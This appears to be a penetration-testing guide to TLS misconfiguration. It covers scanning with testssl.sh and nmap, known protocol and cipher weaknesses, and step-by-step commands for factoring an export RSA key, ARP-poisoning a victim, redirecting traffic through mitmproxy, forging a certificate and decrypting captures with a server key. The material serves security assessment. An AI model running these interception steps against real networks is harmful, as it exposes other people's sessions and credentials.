# TLS misconfiguration assessment

Most internal TLS infrastructure is never tested against the same bar as public-facing
services. Weak cipher suites, outdated protocol versions, and missing forward secrecy
are common findings that translate directly into session decryption and MITM capability.

## Enumeration

```text
# comprehensive TLS scan
testssl.sh --full target.example.com

# targeted checks for known vulnerabilities
testssl.sh --drown --freak --logjam --robot --poodle --beast --breach target.example.com

# scan multiple internal hosts
testssl.sh --file hosts.txt --parallel

# nmap for quick cipher suite enumeration
nmap --script ssl-enum-ciphers -p 443,8443,8080 target.example.com
```

Review testssl output for any cipher rated C or lower, any protocol older than TLS 1.2,
and any missing forward secrecy (RSA key exchange without ECDHE).

## What to look for

Protocol downgrade targets:

- SSLv2 support: DROWN attack applies. Any server accepting SSLv2 alongside modern
  TLS allows an attacker to decrypt modern sessions using the weak SSLv2 path.
- SSLv3 support: POODLE. CBC encryption in SSLv3 has no reliable padding check;
  a MITM can recover cookie values byte by byte in ~256 requests per byte.
- TLS 1.0 support: BEAST on CBC cipher suites with predictable IVs.
- TLS 1.0/1.1: POODLE-TLS on some implementations.

Weak key exchange:

- DHE with parameters under 2048 bits: Logjam range if 512-bit DHE is accepted.
- RSA key exchange (no forward secrecy): sessions can be decrypted if the server's
  private key is later obtained.

Weak cipher suites:

- RC4: statistical bias attacks; captured sessions can be partially decrypted.
- 3DES: SWEET32, birthday attack on 64-bit block ciphers in long sessions.
- NULL encryption: plaintext in a TLS-framed connection.
- EXPORT cipher suites: 40-bit or 56-bit keys; trivially brute-forced.

## FREAK exploitation

FREAK forces negotiation of RSA_EXPORT cipher suites (512-bit RSA). If the server
accepts DHE_EXPORT or RSA_EXPORT, a MITM can intercept the handshake and substitute
a weak key. 512-bit RSA factors in a few hours on modern hardware.

```text
# check for FREAK
testssl.sh --freak target.example.com

# factor the 512-bit RSA key if captured
# use msieve or yafu on the modulus
msieve -v -ms "0 0" MODULUS_DEC
```

FREAK requires an active MITM position: ARP poisoning on a LAN segment or control
of a network device between the client and server.

## Active MITM with mitmproxy

For internal network segments where the attacker has a foothold, mitmproxy with SSL
stripping or forced downgrade:

```text
# install mitmproxy
pip install mitmproxy

# transparent proxy mode: requires iptables redirect
mitmproxy --mode transparent --ssl-insecure

# iptables redirect on Linux
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

For ARP poisoning on a LAN segment to achieve the MITM position:

```text
# arpspoof (from dsniff)
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &

# enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Certificate validation failures

Services with self-signed certificates or certificates signed by an internal CA that
is not validated by clients are vulnerable to certificate substitution: any CA trusted
by the client can issue a certificate for the target hostname.

```text
# check certificate chain
openssl s_client -connect target.example.com:443 -showcerts 2>/dev/null | \
  openssl x509 -noout -text | grep -A2 Issuer

# generate a spoofed certificate with your own CA
openssl req -new -newkey rsa:2048 -keyout spoof.key -out spoof.csr -nodes \
  -subj "/CN=target.example.com"
openssl x509 -req -in spoof.csr -CA myca.crt -CAkey myca.key -CAcreateserial \
  -out spoof.crt -days 90
```

## Capture and decrypt with Wireshark

If the server's private key is obtained (from a compromised host, leaked file, or
weak key factored as above), past and future sessions using that key without forward
secrecy can be decrypted.

```text
# in Wireshark: Edit > Preferences > Protocols > TLS > RSA keys list
# add: IP, port, protocol, key file path

# from the command line with tshark
tshark -r capture.pcapng \
  -o "tls.keys_list:0.0.0.0,443,http,server.key" \
  -Y "http" -T fields -e http.request.uri -e http.file_data
```

This only works for sessions using RSA key exchange (no ECDHE). Sessions with ECDHE
require the session keys, not the server private key.
